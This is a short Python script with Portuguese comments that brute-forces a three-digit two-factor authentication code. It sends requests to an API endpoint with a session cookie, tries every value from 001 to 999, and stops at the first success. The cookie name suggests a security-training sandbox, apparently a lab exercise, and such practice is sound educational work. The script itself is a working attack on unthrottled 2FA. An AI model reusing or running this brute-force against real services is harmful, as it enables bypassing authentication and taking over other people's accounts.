import requests

colors = {'red': '\033[1;31m',
          'green': '\033[1;32m',
          'white': '\033[1;37m'} 

headers = {
    'Cookie': 'PatoAcademy-SandboxId=00000000000000000'  # Cookie de sessão
}

for i in range(1, 999, 1): # Começa em 1, vai até 999 somando 1 a cada execução
    url = f'https://pato.run/api/2fa/{str(i).zfill(3)}'

    response = requests.get(url, headers=headers)
    status_code = response.status_code 

    if status_code == 200:
        print(f"{colors['green']}VALIDO! {colors['white']}Status Code: {status_code} | Tentativa: {colors['green']}{str(i).zfill(3)}")
        break
    elif status_code == 402:
        print(f"{colors['red']}INVALIDO! {colors['white']}Status Code: {status_code} | Tentativa: {str(i).zfill(3)}")
    else:
        print(f"{colors['red']}ERRO! {colors['white']}Status Code não tratado: {status_code} | Tentativa: {str(i).zfill(3)}")

